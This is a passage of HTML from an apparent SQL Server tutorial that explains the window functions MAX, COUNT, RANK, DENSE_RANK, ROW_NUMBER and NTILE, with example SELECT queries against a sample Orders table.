class="crayon-e">minimum_order_amount </span></div><div class="crayon-line" id="crayon-5b9189b2998c5800706031-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998c5800706031-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-96.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-96.png" /></noscript>
</p>
<p><strong>MAX()</strong>
</p>
<p>
  Just as the MIN() functions gives you the minimum value, the MAX() function will identify the largest value of a specified field for a specified group of rows or for the entire table if a group is not specified. 
</p>
<p>
  let’s find the biggest order (maximum order amount) for each city. 
</p>

		<div id="crayon-5b9189b2998cd182649173" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998cd182649173-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998cd182649173-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998cd182649173-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998cd182649173-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998cd182649173-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998cd182649173-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998cd182649173-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998cd182649173-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">MAX</span><span class="crayon-sy">(</span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-e">maximum_order_amount </span></div><div class="crayon-line" id="crayon-5b9189b2998cd182649173-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5b9189b2998cd182649173-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-97.png" class="wp-image-18184" srcset="https://www.sqlshack.com/wp-content/uploads/2017/06/word-image-97.png 524w, https://www.sqlshack.com/wp-content/uploads/2017/06/word-image-97-300x135.png 300w" sizes="(max-width: 524px) 100vw, 524px"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-97.png" class="wp-image-18184" srcset="https://www.sqlshack.com/wp-content/uploads/2017/06/word-image-97.png 524w, https://www.sqlshack.com/wp-content/uploads/2017/06/word-image-97-300x135.png 300w" sizes="(max-width: 524px) 100vw, 524px" /></noscript>
</p>
<p><strong>COUNT()</strong>
</p>
<p>
  The COUNT() function will count the records / rows.
</p>
<p>
  Note that DISTINCT is not supported with window COUNT() function whereas it is supported for the regular COUNT() function. DISTINCT helps you to find the distinct values of a specified field. 
</p>
<p>
  For example, if we want to see how many customers have placed an order in April 2017, we cannot directly count all customers. It is possible that the same customer has placed multiple orders in the same month. 
</p>
<p>
  <b>COUNT(customer_name)</b> will give you an incorrect result as it will count duplicates. Whereas <b>COUNT(DISTINCT customer_name)</b> will give you the correct result as it counts each unique customer only once. 
</p>
<p>
  Valid for regular COUNT() function:
</p>

		<div id="crayon-5b9189b2998d5015379829" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998d5015379829-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998d5015379829-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998d5015379829-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998d5015379829-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998d5015379829-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998d5015379829-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998d5015379829-2"><span class="crayon-e">SELECT </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-e">COUNT</span><span class="crayon-sy">(</span><span class="crayon-e">DISTINCT </span><span class="crayon-v">customer_name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">number_of_customers</span></div><div class="crayon-line" id="crayon-5b9189b2998d5015379829-3"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5b9189b2998d5015379829-4"><span class="crayon-e">GROUP </span><span class="crayon-e">BY </span><span class="crayon-i">city</span></div><div class="crayon-line" id="crayon-5b9189b2998d5015379829-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  Invalid for window COUNT() function:
</p>

		<div id="crayon-5b9189b2998db375123751" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998db375123751-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998db375123751-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998db375123751-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998db375123751-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998db375123751-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998db375123751-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998db375123751-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998db375123751-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">COUNT</span><span class="crayon-sy">(</span><span class="crayon-e">DISTINCT </span><span class="crayon-v">customer_name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-e">number_of_customers</span></div><div class="crayon-line" id="crayon-5b9189b2998db375123751-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5b9189b2998db375123751-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  The above query with Window function will give you below error.
</p>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-98.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-98.png" /></noscript>
</p>
<p>
  Now, let’s find the total order received for each city using window COUNT() function.
</p>

		<div id="crayon-5b9189b2998e2596373601" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998e2596373601-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998e2596373601-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998e2596373601-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998e2596373601-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998e2596373601-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998e2596373601-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998e2596373601-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998e2596373601-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">COUNT</span><span class="crayon-sy">(</span><span class="crayon-v">order_id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-e">total_orders</span></div><div class="crayon-line" id="crayon-5b9189b2998e2596373601-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998e2596373601-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-99.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-99.png" /></noscript>
</p>
<h2>Ranking Window Functions </h2>
<p>
  Just as Window aggregate functions aggregate the value of a specified field, RANKING functions will rank the values of a specified field and categorize them according to their rank. 
</p><div class="mailmunch-forms-in-post-middle" style="display: none !important;"></div>
<p>
  The most common use of RANKING functions is to find the top (N) records based on a certain value. For example, Top 10 highest paid employees, Top 10 ranked students, Top 50 largest orders etc. 
</p>
<p>
  The following are supported RANKING functions:
</p>
<b>
  RANK(), DENSE_RANK(), ROW_NUMBER(), NTILE()
</b>
<p>
  Let’s discuss them one by one.
</p>
<p><strong>RANK()</strong>
</p>
<p>
  The RANK() function is used to give a unique rank to each record based on a specified value, for example salary, order amount etc. 
</p>
<p>
  If two records have the same value then the RANK() function will assign the same rank to both records by skipping the next rank. This means – if there are two identical values at rank 2, it will assign the same rank 2 to both records and then skip rank 3 and assign rank 4 to the next record.
</p>
<p>
  Let’s rank each order by their order amount.
</p>

		<div id="crayon-5b9189b2998eb273821277" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998eb273821277-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998eb273821277-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998eb273821277-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998eb273821277-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998eb273821277-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998eb273821277-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998eb273821277-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5b9189b2998eb273821277-3"><span class="crayon-e">RANK</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-e">order_amount </span><span class="crayon-v">DESC</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Rank</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998eb273821277-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998eb273821277-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-100.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-100.png" /></noscript>
</p>
<p>
  From the above image, you can see that the same rank (3) is assigned to two identical records (each having an order amount of 15,000) and it then skips the next rank (4) and assign rank 5 to next record.
</p>
<p><strong>DENSE_RANK()</strong>
</p>
<p>
  The DENSE_RANK() function is identical to the RANK() function except that it does not skip any rank. This means that if two identical records are found then DENSE_RANK() will assign the same rank to both records but not skip then skip the next rank.
</p>
<p>
  Let’s see how this works in practice.
</p>

		<div id="crayon-5b9189b2998f3630717877" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998f3630717877-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998f3630717877-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998f3630717877-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998f3630717877-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998f3630717877-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998f3630717877-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998f3630717877-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b2998f3630717877-3"><span class="crayon-e">DENSE_RANK</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-e">order_amount </span><span class="crayon-v">DESC</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Rank</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998f3630717877-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998f3630717877-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-101.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-101.png" /></noscript>
</p>
<p>
  As you can clearly see above, the same rank is given to two identical records (each having the same order amount) and then the next rank number is given to the next record without skipping a rank value.
</p>
<p><strong>ROW_NUMBER()</strong>
</p>
<p>
  The name is self-explanatory. These functions assign a unique row number to each record. 
</p>
<p>
  The row number will be reset for each partition if PARTITION BY is specified. Let’s see how ROW_NUMBER() works without PARTITION BY and then with PARTITION BY.
</p>
<p><strong>ROW_ NUMBER() without PARTITION BY</strong>
</p>

		<div id="crayon-5b9189b2998fb676530897" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998fb676530897-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998fb676530897-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998fb676530897-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998fb676530897-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998fb676530897-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998fb676530897-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998fb676530897-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b2998fb676530897-3"><span class="crayon-e">ROW_NUMBER</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">order_id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">row_number</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998fb676530897-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998fb676530897-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-102.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-102.png" /></noscript>
</p>
<p><strong>ROW_NUMBER() with PARTITION BY</strong>
</p>

		<div id="crayon-5b9189b299902772043638" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b299902772043638-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b299902772043638-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b299902772043638-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b299902772043638-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b299902772043638-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b299902772043638-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b299902772043638-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b299902772043638-3"><span class="crayon-e">ROW_NUMBER</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-e">city </span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-e">order_amount </span><span class="crayon-v">DESC</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">row_number</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b299902772043638-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b299902772043638-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-103.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-103.png" /></noscript>
</p>
<p>
  Note that we have done the partition on city. This means that the row number is reset for each city and so restarts at 1 again. However, the order of the rows is determined by order amount so that for any given city the largest order amount will be the first row and so assigned row number 1. 
</p>
<p><strong>NTILE()</strong>
</p>
<p>
  NTILE() is a very helpful window function. It helps you to identify what percentile (or quartile, or any other subdivision) a given row falls into. 
</p>
<p>
  This means that if you have 100 rows and you want to create 4 quartiles based on a specified value field you can do so easily and see how many rows fall into each quartile. 
</p>
<p>
  Let’s see an example. In the query below, we have specified that we want to create four quartiles based on order amount. We then want to see how many orders fall into each quartile.
</p>

		<div id="crayon-5b9189b29990a691112566" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b29990a691112566-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b29990a691112566-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b29990a691112566-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b29990a691112566-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b29990a691112566-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b29990a691112566-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b29990a691112566-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b29990a691112566-3"><span class="crayon-e">NTILE</span><span class="crayon-sy">(</span><span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">row_number</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b29990a691112566-4"><span 